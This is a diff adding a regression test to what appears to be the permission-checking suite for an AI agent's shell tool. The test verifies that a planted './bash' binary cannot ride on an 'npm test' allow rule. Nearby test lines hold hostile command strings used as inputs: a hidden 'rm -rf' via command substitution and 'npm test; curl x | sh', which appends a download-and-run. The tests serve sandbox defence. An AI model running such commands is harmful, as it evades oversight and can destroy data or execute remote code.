@@ -524,6 +524,24 @@ describe('security review regressions', () => {
     expect((await c.attempt('exec_command', exec('rm $(echo -rf) build'))).outcome).toBe('ran');
   });
 
+  test('a -c script is unwrapped only for a bare or system shell, never a planted ./bash', async () => {
+    const c = await chain();
+    c.client.setPermissionMode('default');
+    c.client.addPermissionRule('allow', 'Bash(npm test:*)');
+    const planted = join(c.root, 'bash');
+    writeFileSync(planted, '#!/bin/sh\n');
+    for (const script of ['./bash -lc "npm test"', `${planted} -lc "npm test"`, '/tmp/x/bash -lc "npm test"'])
+      expect({script, outcome: (await c.attempt('exec_command', exec(script))).outcome}).toEqual({
+        script,
+        outcome: 'prompt',
+      });
+    for (const script of ['bash -lc "npm test"', '/bin/bash -lc "npm test"', '/bin/sh -c "npm test"'])
+      expect({script, outcome: (await c.attempt('exec_command', exec(script))).outcome}).toEqual({
+        script,
+        outcome: 'ran',
+      });
+  });
+
   test('Bash(npm test:*) does not allow `npm test; curl x | sh`', async () => {
     const c = await chain();
     c.client.setPermissionMode('default');
